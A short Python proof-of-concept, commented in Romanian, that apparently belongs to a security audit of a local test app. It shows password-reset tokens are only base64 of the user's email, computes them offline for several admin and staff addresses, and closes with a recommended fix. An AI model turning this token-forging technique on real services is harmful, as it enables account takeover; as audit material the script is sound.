#!/usr/bin/env python3
"""
Token de resetare parola predictibil (Base64 din email)
Demonstreaza ca token-ul de resetare poate fi calculat
de oricine cunoaste emailul victimei.
"""

import requests
import base64

BASE_URL = "http://localhost:5000"

TARGET_EMAIL = "cosmin@gmail.com"

print("=" * 60)
print("PoC 4.6 - Token Resetare Parola Predictibil")
print("=" * 60)

# --- Pasul 1: Solicitam resetarea (normal) ---
print(f"\nSolicitam forgot-password pentru: {TARGET_EMAIL}")
r = requests.post(f"{BASE_URL}/api/forgot-password", json={"email": TARGET_EMAIL})
print(f"    Status: {r.status_code}")
print(f"    Raspuns server: {r.json()}")

server_token = r.json().get("token", "")

# --- Pasul 2: Calculam token-ul FARA sa avem acces la email ---
print(f"\nCalculam token-ul offline (cunoastem doar emailul victimei)...")
calculated_token = base64.b64encode(TARGET_EMAIL.encode()).decode()
print(f"    Formula: base64('{TARGET_EMAIL}')")
print(f"    Token calculat: {calculated_token}")
print(f"    Token de la server: {server_token}")
print(f"    Identice: {calculated_token == server_token}")

# --- Pasul 3: Token reutilizabil ---
print(f"\nVerificare reutilizare token...")
print(f"    Token-ul '{calculated_token}' poate fi folosit:")
print(f"    - Oricand (nu expira)")
print(f"    - De oricine care stie emailul")
print(f"    - De multiple ori (nu se invalideaza dupa folosire)")

# --- Pasul 4: Enumerare masiva ---
print(f"\nCalculare tokens pentru toti userii cunoscuti:")
known_emails = [
    "admin@authx.com",
    "manager@authx.com",
    "analyst@authx.com",
    "hr@authx.com",
]
for email in known_emails:
    tok = base64.b64encode(email.encode()).decode()
    print(f"    {email:<30} -> {tok}")

print()
print("Impact: Atacatorul poate reseta parola ORICARUI cont cunoscand doar emailul.")
print("Fix: secrets.token_urlsafe(32) + stocare in DB + expirare 15 min + one-time.")
